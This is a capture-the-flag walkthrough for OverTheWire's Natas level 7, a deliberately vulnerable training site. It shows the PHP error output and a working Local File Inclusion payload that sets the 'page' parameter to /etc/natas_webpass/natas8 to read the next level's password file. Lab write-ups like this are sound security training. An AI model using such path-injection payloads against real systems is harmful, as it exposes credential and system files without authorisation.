# 🔐 Natas 7 Walkthrough

Here we can see two subpages we can go to, while clicking both of them we can see that 
the url changes from:

```
http://natas7.natas.labs.overthewire.org/index.php?page=home
```

to:

```
http://natas7.natas.labs.overthewire.org/index.php?page=about
```

What's the difference in those url's? Well the `page=X`, this loads the page based on this parameter.

## 🔍 Observing a Clue

Inspecting the site we can see a hint which tells us that the password is hidden in: `/etc/natas_webpass/natas8`. Naturally we try to paste that in the url:

```
http://natas7.natas.labs.overthewire.org/index.php?page=about/etc/natas_webpass/natas8
```

The output however isnt what we would want. We receive an error:

```
Warning: include(about/etc/natas_webpass/natas8): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21 Warning: include(): Failed opening 'about/etc/natas_webpass/natas8' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21
```

Why? Because the server is interpreting `page=about/etc/natas_webpass/natas8`, meaning it's looking inside the `about/` folder — which doesn't exist or doesn't contain our target file.

## :hammer: How can we exploit that?

This is a classic Local File Inclusion (LFI) vulnerability. Instead of appending to `about/`, we need to overwrite the entire ***page*** parameter with the full path:

```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

This naturally gives us the password to the next level. 
